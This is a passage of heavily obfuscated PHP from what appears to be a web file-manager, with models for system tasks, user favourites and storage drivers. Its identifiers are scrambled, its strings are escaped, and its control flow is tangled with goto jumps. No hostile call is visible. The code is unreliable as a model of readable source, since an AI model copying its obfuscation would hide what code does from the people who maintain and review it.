$b™Ì‡ÍèÕ)); foreach ($C±—‰š˜Ç© as $b™Ì‡ÍèÕ) { $fÃ„Üßá… = explode($CÌ¾šñ¸ù[94], $b™Ì‡ÍèÕ); if ($fÃ„Üßá…[0] == $CÌ¾šñ¸ù[2072] && $fÃ„Üßá…[1] != $CÌ¾šñ¸ù[1069]) { $D¯´·®¿ƒ = $fÃ„Üßá…[0] . $CÌ¾šñ¸ù[94] . $fÃ„Üßá…[1] . $CÌ¾šñ¸ù[2073]; if (!in_array($D¯´·®¿ƒ, $C±—‰š˜Ç©)) { $AÈè¼èÔñ[] = $D¯´·®¿ƒ; } } $AÈè¼èÔñ[] = $b™Ì‡ÍèÕ; } $b™Ì‡ÍèÕ = implode($CÌ¾šñ¸ù[47], $AÈè¼èÔñ); } public function sort($D½ÀÌ“İÜ, $a˜Ÿ‰ß˜ÔÅ) { return parent::update($D½ÀÌ“İÜ, $a˜Ÿ‰ß˜ÔÅ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\x2e\x74\141\x73\x6b\114\151\163\164"; public $field = array("\x6e\x61\x6d\x65", "\x74\x79\160\145", "\x65\x76\x65\x6e\x74", "\164\151\155\145", "\x64\x65\x73\x63", "\163\171\x73\x74\x65\155", "\145\156\x61\142\154\145", "\x6c\141\163\x74\x52\x75\156", "\x73\157\x72\164"); public function listData($AÙôÂ”ã”î = false, $C¶éèÒ´Ôê = "\x73\157\x72\x74", $EÃº«£ƒÏ = false) { return parent::listData($AÙôÂ”ã”î, $C¶éèÒ´Ôê, $EÃº«£ƒÏ); } public function add($e†øÒ¡¶÷š) { $B÷ËÕ¤ì° =& $_SERVER[Æ¼ôºÙï]; $A¨ñŞ÷¸íÜ = $this->findByName($e†øÒ¡¶÷š[$B÷ËÕ¤ì°[28]]); if ($A¨ñŞ÷¸íÜ) { return !1; } $e†øÒ¡¶÷š[$B÷ËÕ¤ì°[1466]] = 0; $e†øÒ¡¶÷š[$B÷ËÕ¤ì°[1684]] = $this->getSort(); return parent::insert($e†øÒ¡¶÷š); } private function getSort() { $EË×Ì÷¢­§ =& $_SERVER[Æ¼ôºÙï]; $Aƒµó¯ù´ = parent::listData(); $CÚŞÎ´‰¢¦ = array_to_keyvalue($Aƒµó¯ù´, $EË×Ì÷¢­§[33], $EË×Ì÷¢­§[1684]); return empty($CÚŞÎ´‰¢¦) ? 0 : max($CÚŞÎ´‰¢¦) + 1; } public function update($eÉÇæğ‹, $b¼Â ©¥³Š) { $Eô µ³„òƒ =& $_SERVER[Æ¼ôºÙï]; $f®›«‰ŠâŒ = $this->listData($eÉÇæğ‹); $FÈè½à»Êƒ = $this->findByName($b¼Â ©¥³Š[$Eô µ³„òƒ[28]]); if (!$f®›«‰ŠâŒ || $FÈè½à»Êƒ && $FÈè½à»Êƒ[$Eô µ³„òƒ[385]] != $f®›«‰ŠâŒ[$Eô µ³„òƒ[385]]) { return !1; } return parent::update($eÉÇæğ‹, $b¼Â ©¥³Š); } public function remove($eĞÛøŸÓ¦, $dŒ…Í…‹ñ× = false) { $CŠ®¸•‹Äß =& $_SERVER[Æ¼ôºÙï]; $AÜ“‡ÔÅÉö = $this->listData($eĞÛøŸÓ¦); if (!$AÜ“‡ÔÅÉö) { return; } if (!$dŒ…Í…‹ñ× && $AÜ“‡ÔÅÉö[$CŠ®¸•‹Äß[1146]] == $CŠ®¸•‹Äß[86]) { return !1; } return parent::remove($eĞÛøŸÓ¦); } public function enable($E¾ªİåî„°, $c¾ÇÃĞŒ¡è) { return $this->update($E¾ªİåî„°, array($_SERVER[Æ¼ôºÙï][2064] => $c¾ÇÃĞŒ¡è)); } public function run($B“ç·ÆÁ) { return $this->update($B“ç·ÆÁ, array($_SERVER[Æ¼ôºÙï][2074] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\x72\x5f\x66\x61\x76"; protected function cacheFunctionAlias($eÕ£ì“óÁÎ) { $F“Ï›ŸÍÎÛ =& $_SERVER[Æ¼ôºÙï]; return array($F“Ï›ŸÍÎÛ[1762] => array(USER_ID, $F“Ï›ŸÍÎÛ[2075])); } protected function listData() { $d‹ëßåÌ›î =& $_SERVER[Æ¼ôºÙï]; $dªŒìÚÃ×ë = array($d‹ëßåÌ›î[1494] => USER_ID, $d‹ëßåÌ›î[452] => 0); $eçñó÷î™» = $d‹ëßåÌ›î[2076]; $DáìÚƒìö” = $this->field($eçñó÷î™»)->where($dªŒìÚÃ×ë)->order($d‹ëßåÌ›î[2077])->select(); return $DáìÚƒìö” ? $DáìÚƒìö” : array(); } protected function resetCache() { } protected function listView() { goto FÑÕœÊ›¡å; CÕ¬ùßËõ‡: $B³º·»£î½ = array($AÍ±›²„‚Ù[401] => array($AÍ±›²„‚Ù[402], $F¶Î»µµõ÷)); $b‚«§ØÚ¶¤ = Model($AÍ±›²„‚Ù[770])->listSource($B³º·»£î½, $CÁÎÉ‡ËÂ); $b‚«§ØÚ¶¤ = array_merge($b‚«§ØÚ¶¤[$AÍ±›²„‚Ù[73]], $b‚«§ØÚ¶¤[$AÍ±›²„‚Ù[74]]); goto cÎŒÆŒ–Â; cÎŒÆŒ–Â: $b‚«§ØÚ¶¤ = array_to_keyvalue($b‚«§ØÚ¶¤, $AÍ±›²„‚Ù[387]); foreach ($aë½’ÇË‹ as $F¦»Ü§ƒó => $câ¤÷‘¥¸•) { $A—ù‰ñ¹«Ê = $b‚«§ØÚ¶¤[$câ¤÷‘¥¸•[$AÍ±›²„‚Ù[75]]]; $A—ù‰ñ¹«Ê = $A—ù‰ñ¹«Ê ? $A—ù‰ñ¹«Ê : array(); $aë½’ÇË‹[$F¦»Ü§ƒó] = array_merge($A—ù‰ñ¹«Ê, $câ¤÷‘¥¸•); } return $aë½’ÇË‹; goto FŒÀ•Ë¹ˆ“; FÑÕœÊ›¡å: $AÍ±›²„‚Ù =& $_SERVER[Æ¼ôºÙï]; $aë½’ÇË‹ = $this->listData(); $F‡²¨Ö©›Ö = array_filter_by_field($aë½’ÇË‹, $AÍ±›²„‚Ù[29], $AÍ±›²„‚Ù[400]); goto eÒ´‡§óáÏ; eÒ´‡§óáÏ: $F¶Î»µµõ÷ = array_to_keyvalue($F‡²¨Ö©›Ö, $AÍ±›²„‚Ù[33], $AÍ±›²„‚Ù[75]); if (!$F¶Î»µµõ÷) { return $aë½’ÇË‹; } $CÁÎÉ‡ËÂ = 2000; goto CÕ¬ùßËõ‡; FŒÀ•Ë¹ˆ“: } protected function addFav($b˜É¥±©¼, $d¬°ËŠ·ßÌ = '', $D§÷Ğ½¾à = "\163\157\165\162\143\x65") { goto B†ƒÂˆíÒ; F…Ïê‹˜Ô: return $this->add($c·ƒ­É  ); goto f×²…¯†¬å; eö‚Îƒ¯—: $bº·÷áÊß = array($b÷¨è¯Š¿Í[1494] => USER_ID, $b÷¨è¯Š¿Í[452] => 0); $AÈÈ³½¶ÉĞ = $this->where($bº·÷áÊß)->max($b÷¨è¯Š¿Í[1684]); if (!$AÈÈ³½¶ÉĞ) { $AÈÈ³½¶ÉĞ = 0; } goto aÙÖ‡¹«…¨; aÙÖ‡¹«…¨: if (!$d¬°ËŠ·ßÌ && $D§÷Ğ½¾à == $b÷¨è¯Š¿Í[400]) { $BË›ŸáğºÚ = Model($b÷¨è¯Š¿Í[1182])->where(array($b÷¨è¯Š¿Í[401] => $b˜É¥±©¼))->find(); if (!$BË›ŸáğºÚ) { return !1; } $d¬°ËŠ·ßÌ = $BË›ŸáğºÚ[$b÷¨è¯Š¿Í[28]]; } $d¬°ËŠ·ßÌ = $this->getAutoName($d¬°ËŠ·ßÌ); $c·ƒ­É   = array($b÷¨è¯Š¿Í[1494] => USER_ID, $b÷¨è¯Š¿Í[452] => 0, $b÷¨è¯Š¿Í[404] => $d¬°ËŠ·ßÌ, $b÷¨è¯Š¿Í[405] => $b˜É¥±©¼, $b÷¨è¯Š¿Í[406] => $D§÷Ğ½¾à, $b÷¨è¯Š¿Í[1665] => $AÈÈ³½¶ÉĞ + 1); goto F…Ïê‹˜Ô; B†ƒÂˆíÒ: $b÷¨è¯Š¿Í =& $_SERVER[Æ¼ôºÙï]; $bº·÷áÊß = array($b÷¨è¯Š¿Í[1494] => USER_ID, $b÷¨è¯Š¿Í[452] => 0, $b÷¨è¯Š¿Í[406] => $D§÷Ğ½¾à, $b÷¨è¯Š¿Í[405] => $b˜É¥±©¼); if ($this->where($bº·÷áÊß)->find()) { return !1; } goto eö‚Îƒ¯—; f×²…¯†¬å: } protected function remove($c÷Ëä’äº·) { $b’¦µ‹£° =& $_SERVER[Æ¼ôºÙï]; $f×ìÛàœ¹ = array($b’¦µ‹£°[1494] => USER_ID, $b’¦µ‹£°[403] => $c÷Ëä’äº·); return $this->where($f×ìÛàœ¹)->delete(); } protected function removeByName($b†ÉÌñœ–) { $a‹ï¹ê‰»ñ =& $_SERVER[Æ¼ôºÙï]; $dÆÜ‰Ìèğ = array($a‹ï¹ê‰»ñ[1494] => USER_ID, $a‹ï¹ê‰»ñ[404] => $b†ÉÌñœ–, $a‹ï¹ê‰»ñ[452] => 0); return $this->where($dÆÜ‰Ìèğ)->delete(); } protected function rename($C¤¨ŞèÂ´, $d©ˆŞƒùÎ“) { $C’âƒ¡¬ÂŒ =& $_SERVER[Æ¼ôºÙï]; if ($C¤¨ŞèÂ´ == $d©ˆŞƒùÎ“) { return !1; } $d´ğÆâÈ¤¯ = $this->getAutoName($d©ˆŞƒùÎ“); if ($d©ˆŞƒùÎ“ != $d´ğÆâÈ¤¯) { return !1; } $FÓ‚Ö÷¶Şö = array($C’âƒ¡¬ÂŒ[1494] => USER_ID, $C’âƒ¡¬ÂŒ[452] => 0, $C’âƒ¡¬ÂŒ[28] => $C¤¨ŞèÂ´); return $this->where($FÓ‚Ö÷¶Şö)->save(array($C’âƒ¡¬ÂŒ[28] => $d©ˆŞƒùÎ“)); } protected function resetSort($Aœ°…’ÔÆ˜) { $B ‹Êõ®ÑÅ =& $_SERVER[Æ¼ôºÙï]; $Aœ°…’ÔÆ˜ = is_array($Aœ°…’ÔÆ˜) ? $Aœ°…’ÔÆ˜ : array(); $EŸÅ®¡Ä„‡ = array($B ‹Êõ®ÑÅ[1494] => USER_ID); for ($BÑçó‘Şã¨ = 0; $BÑçó‘Şã¨ < count($Aœ°…’ÔÆ˜); $BÑçó‘Şã¨++) { $EŸÅ®¡Ä„‡[$B ‹Êõ®ÑÅ[403]] = $Aœ°…’ÔÆ˜[$BÑçó‘Şã¨]; $this->where($EŸÅ®¡Ä„‡)->save(array($B ‹Êõ®ÑÅ[1665] => $BÑçó‘Şã¨ + 1)); } return !0; } protected function moveTop($bèŒ‚Š³Œ‚) { goto Fºß¿ê×–Õ; F³İ²˜Î¯: if (!$CÊèÛ†‘¤Ü) { return; } $FìÚ±‡Î = $this->field($eÑ„…Ø÷‘[385])->where($fÄœæŠë ©)->order($eÑ„…Ø÷‘[2077])->select(); $FìÚ±‡Î = array_to_keyvalue($FìÚ±‡Î, $eÑ„…Ø÷‘[33], $eÑ„…Ø÷‘[385]); goto B–«§±Õ×·; F…çÊîÛŠÀ: return $this->resetSort($FìÚ±‡Î); goto fíÃÛóæ±º; B–«§±Õ×·: $Fõ÷„™‚ƒê = $FìÚ±‡Î; $FìÚ±‡Î = array_remove_value($FìÚ±‡Î, $CÊèÛ†‘¤Ü[$eÑ„…Ø÷‘[385]]); array_unshift($FìÚ±‡Î, $CÊèÛ†‘¤Ü[$eÑ„…Ø÷‘[385]]); goto F…çÊîÛŠÀ; Fºß¿ê×–Õ: $eÑ„…Ø÷‘ =& $_SERVER[Æ¼ôºÙï]; $fÄœæŠë © = array($eÑ„…Ø÷‘[1494] => USER_ID, $eÑ„…Ø÷‘[452] => 0); $CÊèÛ†‘¤Ü = $this->where($fÄœæŠë ©)->where(array($eÑ„…Ø÷‘[28] => $bèŒ‚Š³Œ‚))->find(); goto F³İ²˜Î¯; fíÃÛóæ±º: } protected function moveBottom($C£àòâªíÔ) { $EÖ—ª˜²¹  =& $_SERVER[Æ¼ôºÙï]; $c‰ÙÉŸË¡˜ = array($EÖ—ª˜²¹ [1494] => USER_ID, $EÖ—ª˜²¹ [452] => 0); $fĞè”¤Ëù = $this->where($c‰ÙÉŸË¡˜)->max($EÖ—ª˜²¹ [1684]); $aôùÕÌçŠÇ = array($EÖ—ª˜²¹ [1684] => $fĞè”¤Ëù + 1); return $this->where($c‰ÙÉŸË¡˜)->where(array($EÖ—ª˜²¹ [28] => $C£àòâªíÔ))->save($aôùÕÌçŠÇ); } private function getAutoName($e¡ïÎ²Ï™) { goto BÅùãŠ«Ò; eèãÙÆ¦Œ: $BŠ¾²ì µ… = array_to_keyvalue($BŠ¾²ì µ…, $C ÉÌÎİŠ[33], $C ÉÌÎİŠ[28]); if (!$BŠ¾²ì µ… || !in_array($e¡ïÎ²Ï™, $BŠ¾²ì µ…)) { return $e¡ïÎ²Ï™; } for ($fàÛîšéä  = 0; $fàÛîšéä  < count($BŠ¾²ì µ…); $fàÛîšéä ++) { if (!in_array($e¡ïÎ²Ï™ . "\50{$fàÛîšéä }\x29", $BŠ¾²ì µ…)) { return $e¡ïÎ²Ï™ . "\50{$fàÛîšéä }\x29"; } } goto BÜõéäÄ¡º; BÅùãŠ«Ò: $C ÉÌÎİŠ =& $_SERVER[Æ¼ôºÙï]; $fµî…ñÖÓµ = array($C ÉÌÎİŠ[1494] => USER_ID, $C ÉÌÎİŠ[452] => 0); $BŠ¾²ì µ… = $this->field($C ÉÌÎİŠ[28])->where($fµî…ñÖÓµ)->select(); goto eèãÙÆ¦Œ; BÜõéäÄ¡º: return $e¡ïÎ²Ï™ . "\50{$fàÛîšéä }\x29"; goto bƒ»¹¹áçÔ; bƒ»¹¹áçÔ: } } goto Dá†ğÌÜ—È; AÚëƒÛ²Ãè: class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\56\x73\164\x6f\162\x61\147\145\x4c\151\163\x74"; public $field = array("\156\x61\155\x65", "\x73\x69\172\145\115\x61\x78", "\163\171\163\164\145\x6d", "\144\x65\x66\x61\165\x6c\164", "\144\162\x69\166\x65\162", "\x63\157\156\146\x69\147"); public function listData($C„ôê®ÎßÛ = false, $aóö¯‘õ”Ì = "\155\157\x64\151\x66\x79\124\x69\155\145", $cß‡«‰­Œ = false) { goto cßÕäé§¦; A¹„Œª±±£: return $dØ¦©Ğ‡ê…; goto Eç³°æÍ; dô®Ù“´: foreach ($dØ¦©Ğ‡ê… as $D Âš´¡í¯ => $EåğÙì›øĞ) { unset($dØ¦©Ğ‡ê…[$D Âš´¡í¯][$ašÀÑáø¡†[6]]); $dØ¦©Ğ‡ê…[$D Âš´¡í¯][$ašÀÑáø¡†[1647]] = 0; } $B•îÜ®Òõè = array_to_keyvalue($dØ¦©Ğ‡ê…, $ašÀÑáø¡†[33], $ašÀÑáø¡†[385]); $this->_listAppendSize($dØ¦©Ğ‡ê…, $B•îÜ®Òõè); goto A¹„Œª±±£; cßÕäé§¦: $ašÀÑáø¡† =& $_SERVER[Æ¼ôºÙï]; $dØ¦©Ğ‡ê… = parent::listData($C„ôê®ÎßÛ, $aóö¯‘õ”Ì, $cß‡«‰­Œ); if ($C„ôê®ÎßÛ) { return $dØ¦©Ğ‡ê…; } goto dô®Ù“´; Eç³°æÍ: } public function _listAppendSize(&$E¬ÑñÂÇĞ¨, $Bæà»“Š‰») { $FÔ­¶óÍ³ =& $_SERVER[Æ¼ôºÙï]; if (!$Bæà»“Š‰») { return; } $d–ÁšÒš¶Á = $FÔ­¶óÍ³[1959] . implode($FÔ­¶óÍ³[47], $Bæà»“Š‰») . $FÔ­¶óÍ³[1960]; $D¶ŠÚ¹Óà‚ = Model($FÔ­¶óÍ³[737])->query($d–ÁšÒš¶Á); $D¶ŠÚ¹Óà‚ = array_to_keyvalue($D¶ŠÚ¹Óà‚, $FÔ­¶óÍ³[385], $FÔ­¶óÍ³[77]); foreach ($E¬ÑñÂÇĞ¨ as $bö½ºÇå ® => $F£ƒÒ‰…Ö) { $E¬ÑñÂÇĞ¨[$bö½ºÇå ®][$FÔ­¶óÍ³[1647]] = isset($D¶ŠÚ¹Óà‚[$F£ƒÒ‰…Ö[$FÔ­¶óÍ³[385]]]) ? $D¶ŠÚ¹Óà‚[$F£ƒÒ‰…Ö[$FÔ­¶óÍ³[385]]] : 0; } } public function getConfig($FÆíñèôÁ) { $c…ˆĞŠªÎ = parent::listData($FÆíñèôÁ); return json_decode($c…ˆĞŠªÎ[$_SERVER[Æ¼ôºÙï][6]], !0); } public function update($EÊäÄŠÑè, $dø•È‹šÌ) { goto AƒÉéø”ÒÈ; CÏ¯”ƒâğÖ: if (isset($A„óööˆ„ù[$Aª½»’ïË¼]) && $A„óööˆ„ù[$Aª½»’ïË¼][$FƒÖë¨®«¬[385]] != $EÊäÄŠÑè) { return !1; } if (isset($dø•È‹šÌ[$FƒÖë¨®«¬[1961]]) && $dø•È‹šÌ[$FƒÖë¨®«¬[1961]] == $FƒÖë¨®«¬[86]) { $this->checkConfig($dø•È‹šÌ); } unset($dø•È‹šÌ[$FƒÖë¨®«¬[1961]]); goto E´Ö¼½“¹İ; E´Ö¼½“¹İ: $aµÀìÑ¦¥Ş = parent::update($EÊäÄŠÑè, $dø•È‹šÌ); if ($aµÀìÑ¦¥Ş && $dø•È‹šÌ[$FƒÖë¨®«¬[34]]) { foreach ($A„óööˆ„ù as $d¬ƒÆêŒ¹) { if ($d¬ƒÆêŒ¹[$FƒÖë¨®«¬[34]] && $d¬ƒÆêŒ¹[$FƒÖë¨®«¬[385]] != $EÊäÄŠÑè) { parent::update($d¬ƒÆêŒ¹[$FƒÖë¨®«¬[385]], array($FƒÖë¨®«¬[34] => 0)); } } } return $aµÀìÑ¦¥Ş; goto a±ƒ¥Àöİ; AƒÉéø”ÒÈ: $FƒÖë¨®«¬ =& $_SERVER[Æ¼ôºÙï]; $Aª½»’ïË¼ = $dø•È‹šÌ[$FƒÖë¨®«¬[28]]; $A„óööˆ„ù = array_to_keyvalue(parent::listData(), $FƒÖë¨®«¬[28]); goto CÏ¯”ƒâğÖ; a±ƒ¥Àöİ: } public function add($D‰ÉÍß‡Øª) { goto F³«Ş®Ì¿; C¿í‹Œ¤ƒ‰: return $d‡ÛËÙ†ã; goto aÏ¸Ùƒ¼Š; e‰£Õ•Ãóê: $this->checkConfig($D‰ÉÍß‡Øª); $d‡ÛËÙ†ã = parent::insert($D‰ÉÍß‡Øª); if ($d‡ÛËÙ†ã && $D‰ÉÍß‡Øª[$d÷òÚÏ„Ùç[34]]) { foreach ($E£ö¾«¸‚Ô as $CÚ¤ï©Î‹Š) { if ($CÚ¤ï©Î‹Š[$d÷òÚÏ„Ùç[34]]) { parent::update($CÚ¤ï©Î‹Š[$d÷òÚÏ„Ùç[385]], array($d÷òÚÏ„Ùç[34] => 0)); } } } goto C¿í‹Œ¤ƒ‰; F³«Ş®Ì¿: $d÷òÚÏ„Ùç =& $_SERVER[Æ¼ôºÙï]; $E£ö¾«¸‚Ô = array_to_keyvalue(parent::listData(), $d÷òÚÏ„Ùç[28]); if (isset($E£ö¾«¸‚Ô[$D‰ÉÍß‡Øª[$d÷òÚÏ„Ùç[28]]])) { return !1; } goto e‰£Õ•Ãóê; aÏ¸Ùƒ¼Š: } public function checkConfig(&$E¸¬Òø¿Ô) { goto Eóë¬ˆß; F³ø˜¶¹­: $B„‡ÅÑ¡ÖÕ = new $BŠÍˆßšî“($B‰‡¦–‚©); if (in_array($C¬¿¬½íó, $B„‡ÅÑ¡ÖÕ->objectDriver)) { if (!$B„‡ÅÑ¡ÖÕ->isBucketCors() && !$B„‡ÅÑ¡ÖÕ->setBucketCors()) { $aææ¤‡Èİ = LNG($e¡¥Û±‰È[1966]); $aææ¤‡Èİ .= $e¡¥Û±‰È[1967] . LNG($e¡¥Û±‰È[1968]); show_json($aææ¤‡Èİ, !1); } } $D½¦œ°°òè = rtrim($B‰‡¦–‚©[$e¡¥Û±‰È[1055]], $e¡¥Û±‰È[8]) . $e¡¥Û±‰È[8]; goto F½íÑÉ®¡…; eÂ®™ã‚·: $E¸¬Òø¿Ô[$e¡¥Û±‰È[6]] = json_encode($B‰‡¦–‚©); $E¸¬Òø¿Ô[$e¡¥Û±‰È[93]] = $E®ˆ»Ğ¤¼á; return !0; goto c¿éÓ¤Ãâë; F½íÑÉ®¡…: $E¹§œ×¶íã = $B„‡ÅÑ¡ÖÕ->getPath($D½¦œ°°òè . $e¡¥Û±‰È[1116]); if (!$B„‡ÅÑ¡ÖÕ->mkfile($E¹§œ×¶íã)) { show_json(LNG($e¡¥Û±‰È[1966]), !1); } $B‰‡¦–‚©[$e¡¥Û±‰È[1055]] = $D½¦œ°°òè; goto eÂ®™ã‚·; A‘Ö©½Ü×: $E®ˆ»Ğ¤¼á = isset($dÇìÇ¿¤­±[$C¬¿¬½íó]) ? $dÇìÇ¿¤­±[$C¬¿¬½íó] : ucfirst($C¬¿¬½íó); $BŠÍˆßšî“ = $e¡¥Û±‰È[71] . $E®ˆ»Ğ¤¼á; if (!$E®ˆ»Ğ¤¼á || !class_exists($BŠÍˆßšî“)) { write_log(array($e¡¥Û±‰È[1963], $E¸¬Òø¿Ô, get_caller_info()), $e¡¥Û±‰È[1964]); show_json(LNG($e¡¥Û±‰È[1965]), !1, $E¸¬Òø¿Ô); } goto F³ø˜¶¹­; Eóë¬ˆß: $e¡¥Û±‰È =& $_SERVER[Æ¼ôºÙï]; $C¬¿¬½íó = strtolower($E¸¬Òø¿Ô[$e¡¥Û±‰È[93]]); $B‰‡¦–‚© = json_decode($E¸¬Òø¿Ô[$e¡¥Û±‰È[6]], !0); goto C²«Ş¿Œ‰å; C²«Ş¿Œ‰å: foreach ($B‰‡¦–‚© as $BÆ„›Üâ¥º => $f²ìõø’ƒ) { $B‰‡¦–‚©[$BÆ„›Üâ¥º] = trim($f²ìõø’ƒ); } $B‰‡¦–‚©[$e¡¥Û±‰È[1962]] = rand_string(6); $dÇìÇ¿¤­± = $GLOBALS[$e¡¥Û±‰È[6]][$e¡¥Û±‰È[87]][$e¡¥Û±‰È[771]]; goto A‘Ö©½Ü×; c¿éÓ¤Ãâë: } public function driverListSystem() { $cçÉÔ‹ª´É =& $_SERVER[Æ¼ôºÙï]; $a¬çººì•” = parent::listData(); $e¬‰®ø™íª = array(); foreach ($a¬çººì•” as $b‰õøŠÜœ‘) { unset($b‰õøŠÜœ‘[$cçÉÔ‹ª´É[192]], $b‰õøŠÜœ‘[$cçÉÔ‹ª´É[83]]); $b‰õøŠÜœ‘[$cçÉÔ‹ª´É[6]] = json_decode($b‰õøŠÜœ‘[$cçÉÔ‹ª´É[6]], !0); $e¬‰®ø™íª[] = $b‰õøŠÜœ‘; } return $e¬‰®ø™íª; } public function defaultDriver() { $F·ƒ¹á²åˆ =& $_SERVER[Æ¼ôºÙï]; $DğÜ—êƒ§ = parent::listData(); $BİÌÒÊäÃ = array_filter_by_field($DğÜ—êƒ§, $F·ƒ¹á²åˆ[34], 1); $BİÌÒÊäÃ = $BİÌÒÊäÃ[0]; if ($BİÌÒÊäÃ) { $BİÌÒÊäÃ[$F·ƒ¹á²åˆ[6]] = json_decode($BİÌÒÊäÃ[$F·ƒ¹á²åˆ[6]], !0); } return $BİÌÒÊäÃ; } public function driverInfo($fœî¥Æš) { $B«¤¦ò°ƒ­ =& $_SERVER[Æ¼ôºÙï]; $Fà­öİˆ¶… = array_to_keyvalue(parent::listData(), $B«¤¦ò°ƒ­[385]); if (!isset($Fà­öİˆ¶…[$fœî¥Æš])) { return !1; } $cí»ÓØâ¡ = $Fà­öİˆ¶…[$fœî¥Æš]; $cí»ÓØâ¡[$B«¤¦ò°ƒ­[6]] = json_decode($cí»ÓØâ¡[$B«¤¦ò°ƒ­[6]], !0); return $cí»ÓØâ¡; } public function remove($CàÔïÙÒÇ) { $this->removeShareItems($CàÔïÙÒÇ); return parent::remove($CàÔïÙÒÇ); } public function removeWithFile($B²ÌƒáÛº, $f¸‚Æèó¡Ù) { goto fÈëô«—Ñ„; fÈëô«—Ñ„: $D‚Æõ‡ˆ¤¤ =& $_SERVER[Æ¼ôºÙï]; $bÙå¨æ“Í± = array($D‚Æõ‡ˆ¤¤[762] => $B²ÌƒáÛº); $F•®ÂÍ¡°£ = Model($D‚Æõ‡ˆ¤¤[439])->where($bÙå¨æ“Í±)->count(); goto aá·”•‹‹; F©·ôÁœŠ: $fìÚ¥”İ‘¶ = "\173\x69\x6f\x3a{$E´“£Ñë¼³}\175\x2f"; $aåæ‡‚Å°’ = !0; $C¸Ÿ…ó„°Â = array(); goto C‰¨˜Úˆ‹©; a¹÷¶‚È¯Â: if (!$aåæ‡‚Å°’) { $b°çğöóãõ->stop($d£Âİˆ·õÇ); return !1; } $b°çğöóãõ->end(); if ($f¸‚Æèó¡Ù == $D‚Æõ‡ˆ¤¤[1627]) { $this->remove($B²ÌƒáÛº); } goto DÈ·æ¡; C‰¨˜Úˆ‹©: $eùå¶Ø˜Úƒ = Model($D‚Æõ‡ˆ¤¤[173])->where($bÙå¨æ“Í±)->field($D‚Æõ‡ˆ¤¤[1971])->select(); foreach ($eùå¶Ø˜Úƒ as $eê‚Øâ‘¼) { goto Bš´×é×©ò; d¶Ô¢•ßå: if (IO::exist($eİäéÂÜ‘ù)) { $b°çğöóãõ->updateFileEnd($eê‚Øâ‘¼[$D‚Æõ‡ˆ¤¤[28]], $eê‚Øâ‘¼[$D‚Æõ‡ˆ¤¤[77]]); continue; } if (!IO::move($aôòÁì³÷, get_path_father($eİäéÂÜ‘ù))) { $aåæ‡‚Å°’ = !1; break; } $bÙå¨æ“Í± = array($D‚Æõ‡ˆ¤¤[436] => $eê‚Øâ‘¼[$D‚Æõ‡ˆ¤¤[436]]); goto E½ôÅé ´; Bš´×é×©ò: $aôòÁì³÷ = $eê‚Øâ‘¼[$D‚Æõ‡ˆ¤¤[75]]; $eİäéÂÜ‘ù = $fìÚ¥”İ‘¶ . str_replace("\x7b\x69\x6f\x3a{$B²ÌƒáÛº}\x7d\x2f", $D‚Æõ‡ˆ¤¤[33], $aôòÁì³÷); if (!IO::exist($aôòÁì³÷)) { $C¸Ÿ…ó„°Â[] = $eê‚Øâ‘¼[$D‚Æõ‡ˆ¤¤[436]]; $b°çğöóãõ->updateFileEnd($eê‚Øâ‘¼[$D‚Æõ‡ˆ¤¤[28]], $eê‚Øâ‘¼[$D‚Æõ‡ˆ¤¤[77]]); continue; } goto d¶Ô¢•ßå; E½ôÅé ´: $dœ…Ï°¤Ì§ = array($D‚Æõ‡ˆ¤¤[762] => $E´“£Ñë¼³, $D‚Æõ‡ˆ¤¤[75] => $eİäéÂÜ‘ù); Model($D‚Æõ‡ˆ¤¤[173])->where($bÙå¨æ“Í±)->save($dœ…Ï°¤Ì§); goto A·»ò¸ğäé; A·»ò¸ğäé: } $this->removeByFileID($C¸Ÿ…ó„°Â); goto a¹÷¶‚È¯Â; aá·”•‹‹: $fâÂê®É½ = Model($D‚Æõ‡ˆ¤¤[439])->where($bÙå¨æ“Í±)->sum($D‚Æõ‡ˆ¤¤[77]); $d£Âİˆ·õÇ = $f¸‚Æèó¡Ù . $D‚Æõ‡ˆ¤¤[1969] . $B²ÌƒáÛº; $b°çğöóãõ = new TaskFileTransfer($d£Âİˆ·õÇ, $D‚Æõ‡ˆ¤¤[1964], $F•®ÂÍ¡°£, LNG($D‚Æõ‡ˆ¤¤[1970]) . "\x28{$B²ÌƒáÛº}\51"); goto C¿Ï‚Š¤Àã; C¿Ï‚Š¤Àã: $b°çğöóãõ->task[$D‚Æõ‡ˆ¤¤[717]] = (double) $fâÂê®É½; $fËÎÈ…Š = KodIO::defaultDriver(); $E´“£Ñë¼³ = $fËÎÈ…Š[$D‚Æõ‡ˆ¤¤[385]]; goto F©·ôÁœŠ; DÈ·æ¡: } public function progress($c´ÊÌ…ƒÓË, $dÀïÉèÜ¢™) { return Task::get($dÀïÉèÜ¢™ . $_SERVER[Æ¼ôºÙï][1969] . $c´ÊÌ…ƒÓË); } private function removeByFileID($C¿°‹„Áà‘ = array()) { goto C‡•Âš•æÖ; C‡•Âš•æÖ: $fŸ–®Š†âİ =& $_SERVER[Æ¼ôºÙï]; if (empty($C¿°‹„Áà‘)) { return; } $DèœÀé®Ê” = array($fŸ–®Š†âİ[436] => array($fŸ–®Š†âİ[7], $C¿°‹„Áà‘)); goto Fã¬”›ƒÖï; Fã¬”›ƒÖï: $E˜¹ŒÁ¢…ğ = Model($fŸ–®Š†âİ[1182])->where($DèœÀé®Ê”)->field($fŸ–®Š†âİ[387])->select(); if (!$E˜¹ŒÁ¢…ğ) { return; } $E˜¹ŒÁ¢…ğ = array_to_keyvalue($E˜¹ŒÁ¢…ğ, $fŸ–®Š†âİ[33], $fŸ–®Š†âİ[387]); goto CğĞ‹×Øœ; CğĞ‹×Øœ: foreach ($E˜¹ŒÁ¢…ğ as $aã°Õ”‚Öë) { Model($fŸ–®Š†âİ[400])->removeNow($aã°Õ”‚Öë, !1); } goto EÎŒ£ßë; EÎŒ£ßë: } private function removeShareItems($BöÌ†Ã®³¹) { goto CæŠ‚ŞÑÁ; E»Â‡£ë–: $C§–×“Äˆ© = Model($D¶ÁïÈ–±ù[1638])->where($fÜô¨Î†ê¨)->field($D¶ÁïÈ–±ù[457])->select(); if (empty($C§–×“Äˆ©)) { return; } $Dİ˜Á®Æ• = array_to_keyvalue($C§–×“Äˆ©, $D¶ÁïÈ–±ù[33], $D¶ÁïÈ–±ù[457]); goto CŞˆÊØ’º; CæŠ‚ŞÑÁ: $D¶ÁïÈ–±ù =& $_SERVER[Æ¼ôºÙï]; 